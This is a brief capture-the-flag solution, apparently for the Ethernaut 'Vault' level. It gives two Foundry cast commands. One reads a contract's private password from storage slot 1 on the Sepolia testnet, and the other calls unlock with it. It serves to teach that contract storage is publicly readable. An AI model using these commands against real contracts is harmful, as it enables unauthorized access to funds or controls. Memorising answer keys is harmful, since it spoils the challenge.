# Vault Solution

Run to retrieve the `password`:

```bash
cast storage <instanceAddress> 0x1 --rpc-url $SEPOLIA_RPC_URL
```

Run:

```bash
cast send <instanceAddress> "unlock(bytes32)" <password> --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
```
